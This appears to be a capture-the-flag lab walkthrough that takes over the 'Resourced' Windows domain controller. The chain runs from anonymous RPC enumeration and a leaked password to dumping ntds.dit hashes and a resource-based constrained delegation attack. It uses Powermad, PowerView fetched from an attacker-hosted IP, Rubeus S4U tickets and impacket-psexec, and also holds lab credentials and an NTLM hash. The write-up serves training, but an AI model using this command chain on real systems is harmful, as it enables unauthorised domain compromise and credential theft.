---
icon: windows
---

# Resourced - Intermediate

## Gaining Access

Nmap scan:

```
#Nmap TCP
nmap -A -T4 -p- -Pn 192.168.118.175 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-19 19:47 EDT
Nmap scan report for 192.168.118.175
Host is up (0.031s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-19 23:49:00Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: resourced
|   NetBIOS_Domain_Name: resourced
|   NetBIOS_Computer_Name: RESOURCEDC
|   DNS_Domain_Name: resourced.local
|   DNS_Computer_Name: ResourceDC.resourced.local
|   DNS_Tree_Name: resourced.local
|   Product_Version: 10.0.17763
|_  System_Time: 2025-09-19T23:49:53+00:00
| ssl-cert: Subject: commonName=ResourceDC.resourced.local
| Not valid before: 2025-09-18T23:46:49
|_Not valid after:  2026-03-20T23:46:49
|_ssl-date: 2025-09-19T23:50:33+00:00; +1s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
49710/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (92%), Microsoft Windows 10 1903 - 21H1 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: RESOURCEDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-09-19T23:49:54
|_  start_date: N/A

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   30.08 ms 192.168.45.1
2   30.04 ms 192.168.45.254
3   31.51 ms 192.168.251.1
4   31.19 ms 192.168.118.175
```

The ldap scan shows us 2 domain names resourced.local & dc.resourced.local. I'll add them and to my /etc/hosts/ file

```
192.168.118.175	resourced.local dc.resourced.local
```

### RPC Enumeration

```
rpcclient -U "" -N 192.168.118.175
```

<figure><img src="../../.gitbook/assets/image (1953).png" alt=""><figcaption></figcaption></figure>

We got a list of users, this is great progress. I'll enumerate further, before deciding to try something else

```
rpcclient -U "" -N 192.168.118.175 -c "querydipsinfo"
```

<figure><img src="../../.gitbook/assets/image (1954).png" alt=""><figcaption></figcaption></figure>

Bingo, a user placed their password in their description. Now we have a user, let's see what we can do with him.

<figure><img src="../../.gitbook/assets/image (1955).png" alt=""><figcaption></figcaption></figure>

There is an interesting share, I am going to take a look at it.

### Smb Enumeration as v.vantz

```
smbclient \\\\192.168.118.175\\"Password Audit" -U "v.Ventz%HotelCalifornia194!"
```

<figure><img src="../../.gitbook/assets/image (1956).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1957).png" alt=""><figcaption></figcaption></figure>

Did we just strike gold that quick? Let's see if the hashes we dump are still available.

### Dumping ntds.dit hashes

```
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

<figure><img src="../../.gitbook/assets/image (1958).png" alt=""><figcaption></figcaption></figure>

Let's see which hashes work for their user.

<figure><img src="../../.gitbook/assets/image (1959).png" alt=""><figcaption></figcaption></figure>

We got a creds for a new user L.Livingstone. Let's check if he can winrm

<figure><img src="../../.gitbook/assets/image (1960).png" alt=""><figcaption></figcaption></figure>

Nice let's get a shell on the system and check his privileges

### Shell as l.livingstone

<figure><img src="../../.gitbook/assets/image (1961).png" alt=""><figcaption></figcaption></figure>

Ok before jumping any deeper into Powerup and winpeas to look for a way to privesc to admin. I am going to collect data for bloodhound using netexec and analyze it.

### Bloodhound

```
netexec ldap 192.168.118.175 -u l.livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808 --bloodhound --collection All --dns-server 192.168.118.175
```

<figure><img src="../../.gitbook/assets/image (1962).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1963).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1964).png" alt=""><figcaption></figcaption></figure>

## GenericAll Abuse

l.livingston has `GenericAll` on the computer object `RESOURCEDC.RESOURCED.LOCAL`

I’ll need three scripts to complete this attack:

* [PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
* [PowerMad.ps1](https://github.com/Kevin-Robertson/Powermad)
* [Rubeus.exe](https://github.com/GhostPack/Rubeus) (pre-compiled exes from [SharpCollection](https://github.com/Flangvik/SharpCollection/tree/master/NetFramework_4.5_x64))

```
powershell -ep bypass
iwr http://192.168.45.158/PowerView.ps1 -outfile PowerView.ps1
iwr http://192.168.45.158/Powermad.ps1 -outfile Powermad.ps1
iwr http://192.168.45.158/Rubeus.exe -outfile Rubeus.exe
. .\PowerView.ps1
. .\Powermad.ps1
```

<figure><img src="../../.gitbook/assets/image (1965).png" alt=""><figcaption></figcaption></figure>

I’ll need to know the administrator on DC, which Bloodhound tells me is administrator@resourced.local

<figure><img src="../../.gitbook/assets/image (1966).png" alt=""><figcaption></figcaption></figure>

I’ll verify that users can add machines to the domain:

```
Get-DomainObject -Identity 'DC=RESOURCED,DC=LOCAL' | select ms-ds-machineaccountquota
```

<figure><img src="../../.gitbook/assets/image (1967).png" alt=""><figcaption></figcaption></figure>

The quota is set to the default of 10, which is good.

I’ll also need to make sure there’s a 2012+ DC in the environment:

<figure><img src="../../.gitbook/assets/image (1968).png" alt=""><figcaption></figcaption></figure>

2019 Standard is great.

Finally, I’ll want to check that the `msds-allowedtoactonbehalfofotheridentity` is empty

```
Get-DomainComputer RESOURCEDC | select name,msds-allowedtoactonbehalfofotheridentity | fl
```

<figure><img src="../../.gitbook/assets/image (1969).png" alt=""><figcaption></figcaption></figure>

This is great now we can proceed!

### Create FakeComputer

I’ll use the Powermad `New-MachineAccount` to create a fake computer:

```
New-MachineAccount -MachineAccount deimos -Password $(ConvertTo-SecureString 'Deimos123!' -AsPlainText -Force)
```

<figure><img src="../../.gitbook/assets/image (1970).png" alt=""><figcaption></figcaption></figure>

I need the SID of the computer object as well, so I’ll save it in a variable

```
$fakesid = Get-DomainComputer deimos -Properties objectsid | Select -Expand objectsid
```

<figure><img src="../../.gitbook/assets/image (1971).png" alt=""><figcaption></figcaption></figure>

### Attack

Now I’ll configure the DC to trust my fake computer to make authorization decisions on it’s behalf. These commands will create an ACL with the fake computer’s SID and assign that to the DC:

```
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($fakesid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
```

```
Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

<figure><img src="../../.gitbook/assets/image (1972).png" alt=""><figcaption></figcaption></figure>

You can verify if it worked(Sometimes it may not work keep going though):

```
$RawBytes = Get-DomainComputer DC -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
```

```
$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
```

```
$Descriptor.DiscretionaryAcl
```

You can also re-run Bloodhound now: And check for this (Reachable High Value Target)

<figure><img src="../../.gitbook/assets/image (1973).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1974).png" alt=""><figcaption></figcaption></figure>

### Auth as Fake Computer

I’ll use `Rubeus` to get the hash of my fake computer account:

```
.\Rubeus.exe hash /password:Deimos123!
```

<figure><img src="../../.gitbook/assets/image (1975).png" alt=""><figcaption></figcaption></figure>

```
.\Rubeus.exe s4u /user:deimos /rc4:94F8B40315E07347227E9EBFAC74B591 /impersonateuser:administrator /msdsspn:cifs/resourcedc.resourced.local /ptt
```

<figure><img src="../../.gitbook/assets/image (1976).png" alt=""><figcaption></figcaption></figure>

### Remote Use

<mark style="color:$danger;">**Very important!!!**</mark> | Otherwise using impacket will not work make sure to update /etc/hosts file

```
192.168.118.175	resourced.local resourcedc.resourced.local
```

I’ll grab the last ticket `Rubeus` generated, and copy it back to my machine, saving it as `ticket.kirbi.b64`, making sure to remove all spaces. I’ll base64 decode it into `ticket.kirbi`:

I remove the white spaces in vi with the vi command line fu:

```
:%s/\s\+//g
```

then

```
base64 -d ticket.kirbi.b64 > ticket.kirbi
```

<figure><img src="../../.gitbook/assets/image (1977).png" alt=""><figcaption></figcaption></figure>

Now I need to convert it to a format that Impact can use:

```
impacket-ticketConverter ticket.kirbi ticket.ccache
```

<figure><img src="../../.gitbook/assets/image (1978).png" alt=""><figcaption></figcaption></figure>

I can use this to get a shell using `impacket-psexec`:

```
KRB5CCNAME=ticket.ccache impacket-psexec resourced.local/administrator@resourcedc.resourced.local -k -no-pass
```

<figure><img src="../../.gitbook/assets/image (1979).png" alt=""><figcaption></figcaption></figure>

Enjoy admin access!!!

**Note if you reset your machine you have to redo all of the parts including the ticket your old ticket will not work**
